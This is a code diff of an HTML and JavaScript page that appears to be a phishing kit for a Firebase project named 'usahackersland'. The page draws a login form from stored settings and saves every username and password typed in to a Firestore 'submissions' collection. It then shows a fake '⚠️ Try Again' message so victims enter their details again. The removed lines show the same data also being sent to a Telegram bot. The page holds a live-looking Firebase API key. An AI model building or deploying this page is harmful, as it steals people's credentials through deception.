@@ -3,46 +3,131 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Form Submission</title>
+<title>Dynamic Form</title>
+
 <style>
-body{font-family:Arial,sans-serif;background:#f4f6f8;padding:20px}
-#formContainer{max-width:600px;margin:auto;background:#fff;padding:20px;border-radius:10px;box-shadow:0 0 10px rgba(0,0,0,0.1)}
-input,textarea,button{width:100%;padding:10px;margin:8px 0;border-radius:6px;border:1px solid #ccc;box-sizing:border-box}
-button{cursor:pointer;background:#1976d2;color:#fff;border:none}
-h2{text-align:center}
-.embedLink{margin-top:6px;padding:6px;background:#e8f0fe;border-radius:6px;word-break:break-all}
-#submitResult{margin:10px 0;color:#b71c1c;font-weight:bold;text-align:center;transition: opacity 0.5s;}
+body{
+  font-family: Arial, sans-serif;
+  background:#f4f6f8;
+  padding:20px;
+}
+
+#formContainer{
+  max-width:600px;
+  margin:auto;
+  background:#fff;
+  padding:20px;
+  border-radius:10px;
+  box-shadow:0 0 10px rgba(0,0,0,0.1);
+}
+
+/* BUILDER STYLE MEDIA */
+.builder-media{
+  text-align:center;
+  margin-bottom:12px;
+}
+.builder-media img{
+  max-width:140px;
+  height:auto;
+  margin-bottom:8px;
+}
+
+/* TEXT */
+h2{
+  text-align:center;
+  margin:10px 0;
+}
+#formDesc{
+  text-align:center;
+  margin-bottom:12px;
+}
+
+/* WARNINGS */
+#failureWarning{
+  color:#b71c1c;
+  font-weight:bold;
+  text-align:center;
+  margin-bottom:4px;
+}
+#submitResult{
+  color:#b71c1c;
+  font-weight:bold;
+  text-align:center;
+  margin-bottom:10px;
+  opacity:0;
+  transition:opacity 0.5s;
+}
+
+/* INPUTS */
+input, textarea, button{
+  width:100%;
+  padding:10px;
+  margin:8px 0;
+  border-radius:6px;
+  border:1px solid #ccc;
+  box-sizing:border-box;
+}
+
+button{
+  cursor:pointer;
+  background:#1976d2;
+  color:#fff;
+  border:none;
+}
+
+/* EMBED LINKS */
+.embedLink{
+  margin-top:6px;
+  padding:6px;
+  background:#e8f0fe;
+  border-radius:6px;
+  word-break:break-all;
+}
 </style>
+
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
 </head>
+
 <body>
 <div id="formContainer">
-<div id="imageContainer"></div> <!-- Images at top -->
-<h2 id="formTitle">Loading...</h2>
-<div id="formDesc"></div>
-<div id="failureWarning" style="color:#b71c1c;font-weight:bold;text-align:center;"></div> <!-- Failure warning -->
-<div id="submitResult"></div> <!-- Try Again will show here -->
-<form id="dynamicForm"></form>
-<div id="embedLinks"></div>
+
+  <!-- BUILDER MEDIA -->
+  <div id="imageContainer" class="builder-media"></div>
+
+  <!-- TITLE & DESC -->
+  <h2 id="formTitle">Loading...</h2>
+  <div id="formDesc"></div>
+
+  <!-- WARNINGS -->
+  <div id="failureWarning"></div>
+  <div id="submitResult">⚠️ Try Again</div>
+
+  <!-- FORM -->
+  <form id="dynamicForm"></form>
+
+  <!-- LINKS -->
+  <div id="embedLinks"></div>
+
 </div>
 
 <script>
 const $ = id => document.getElementById(id);
-const firebaseConfig = {
+
+/* FIREBASE */
+firebase.initializeApp({
   apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
   authDomain: "usahackersland.firebaseapp.com",
   projectId: "usahackersland"
-};
-firebase.initializeApp(firebaseConfig);
+});
 const db = firebase.firestore();
 
-const urlParams = new URLSearchParams(window.location.search);
-const formId = urlParams.get("id");
+/* PARAMS */
+const formId = new URLSearchParams(location.search).get("id");
 const formEl = $("dynamicForm");
+const imageContainer = $("imageContainer");
 const embedEl = $("embedLinks");
 const submitResult = $("submitResult");
-const imageContainer = $("imageContainer");
 const failureWarning = $("failureWarning");
 
 let formConfig = null;
@@ -51,7 +136,7 @@ if(!formId){
   $("formTitle").innerText = "Form ID missing!";
 }
 
-// Load form config
+/* LOAD FORM */
 db.collection("forms").doc(formId).get().then(doc=>{
   if(!doc.exists){
     $("formTitle").innerText = "Form not found!";
@@ -59,107 +144,85 @@ db.collection("forms").doc(formId).get().then(doc=>{
   }
   formConfig = doc.data();
   renderForm();
-}).catch(err=>{
-  $("formTitle").innerText = "Error loading form";
-  console.error(err);
 });
 
-// Render the form dynamically
+/* RENDER EXACTLY LIKE BUILDER */
 function renderForm(){
-  $("formTitle").innerText = formConfig.title;
-  $("formTitle").style.color = formConfig.titleColor;
-  $("formDesc").innerText = formConfig.description;
-  $("formDesc").style.color = formConfig.textColor;
+  $("formTitle").innerText = formConfig.title || "";
+  $("formTitle").style.color = formConfig.titleColor || "#000";
 
-  formEl.innerHTML = "";
+  $("formDesc").innerText = formConfig.description || "";
+  $("formDesc").style.color = formConfig.textColor || "#444";
+
   imageContainer.innerHTML = "";
+  formEl.innerHTML = "";
+  embedEl.innerHTML = "";
 
-  // Avatar & Logo (Top)
-  if(formConfig.avatarURL) imageContainer.innerHTML += `<img src="${formConfig.avatarURL}" style="width:90px;border-radius:50%;display:block;margin:auto 0 10px">`;
-  if(formConfig.logoURL) imageContainer.innerHTML += `<img src="${formConfig.logoURL}" style="width:140px;display:block;margin:auto 0 10px">`;
-
-  // Warning (Failure to verify...)
-  if(formConfig.enableWarning && formConfig.warningPosition!=="none"){
-    failureWarning.innerText = formConfig.warning;
+  /* MEDIA */
+  if(formConfig.avatarURL){
+    imageContainer.innerHTML += `<img src="${formConfig.avatarURL}" style="width:90px;border-radius:50%">`;
+  }
+  if(formConfig.logoURL){
+    imageContainer.innerHTML += `<img src="${formConfig.logoURL}">`;
   }
 
-  // Username & Password
+  /* WARNING */
+  if(formConfig.enableWarning){
+    failureWarning.innerText = formConfig.warning || "";
+  }
+
+  /* AUTH FIELDS */
   if(formConfig.addAuth){
     formEl.innerHTML += `<input name="username" placeholder="${formConfig.usernamePlaceholder}" required>`;
     formEl.innerHTML += `<input type="password" name="password" placeholder="${formConfig.passwordPlaceholder}" required>`;
   }
 
-  // Extra fields
-  formConfig.extraFields.forEach(field=>{
-    if(field) formEl.innerHTML += `<input name="${field}" placeholder="${field}" required>`;
+  /* EXTRA FIELDS */
+  (formConfig.extraFields || []).forEach(f=>{
+    formEl.innerHTML += `<input name="${f}" placeholder="${f}" required>`;
   });
 
-  // Embed Links
-  embedEl.innerHTML = "";
-  formConfig.embedLinks.forEach(link=>{
-    if(!link.show) return;
-    const div = document.createElement("div");
-    div.className = "embedLink";
-    div.innerHTML = `<strong>${link.text}</strong>: <a href="${link.url}" target="_blank">${link.url}</a>`;
-    if(link.desc) div.innerHTML += `<br><small>${link.desc}</small>`;
-    embedEl.appendChild(div);
-  });
-
-  // Main Button
+  /* MAIN BUTTON */
   if(formConfig.showMainBtn){
     const btn = document.createElement("button");
-    btn.textContent = formConfig.buttonText;
-    btn.style.background = formConfig.btnColor;
+    btn.textContent = formConfig.buttonText || "Submit";
+    btn.style.background = formConfig.btnColor || "#1976d2";
     btn.onclick = submitForm;
     formEl.appendChild(btn);
   }
+
+  /* EMBED LINKS */
+  (formConfig.embedLinks || []).forEach(l=>{
+    if(!l.show) return;
+    embedEl.innerHTML += `
+      <div class="embedLink">
+        <strong>${l.text}</strong><br>
+        <a href="${l.url}" target="_blank">${l.url}</a>
+        ${l.desc ? `<br><small>${l.desc}</small>` : ""}
+      </div>
+    `;
+  });
 }
 
-// Submit Form
+/* SUBMIT */
 function submitForm(e){
   e.preventDefault();
-  const formData = {};
-  const inputs = formEl.querySelectorAll("input,textarea");
-  inputs.forEach(i=>{
-    formData[i.name] = i.value;
+
+  const data = {};
+  formEl.querySelectorAll("input,textarea").forEach(i=>{
+    data[i.name] = i.value;
   });
 
-  // Save to Firestore submissions
   db.collection("submissions").add({
     formId,
-    data: formData,
+    data,
     createdAt: new Date().toISOString()
-  }).then(()=>{
-    // Show "Try Again" after failure warning
-    submitResult.innerText = "⚠️ Try Again";
-    submitResult.style.opacity = 1;
-
-    // Hide after 3 seconds
-    setTimeout(()=>submitResult.style.opacity = 0, 3000);
-  }).catch(err=>{
-    submitResult.innerText = "❌ Error saving submission";
-    console.error(err);
   });
 
-  // Send to Telegram
-  const telegramMsg = `📝 New Form Submission\n------------------\n`+
-    Object.entries(formData).map(([k,v])=>`💠 ${k}: ${v}`).join("\n");
+  /* SHOW TRY AGAIN UNDER WARNING */
+  submitResult.style.opacity = 1;
+  setTimeout(()=>submitResult.style.opacity = 0,3000);
 
-  fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage`,{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body: JSON.stringify({
-      chat_id:"YOUR_CHAT_ID",
-      text: telegramMsg
-    })
-  });
-
-  // Redirect if enabled
-  if(formConfig.enableRedirect && formConfig.redirectURL){
-    setTimeout(()=>window.location.href = formConfig.redirectURL, 1500);
-  }
-
-  // Reset form
   formEl.reset();
 }
 </script>
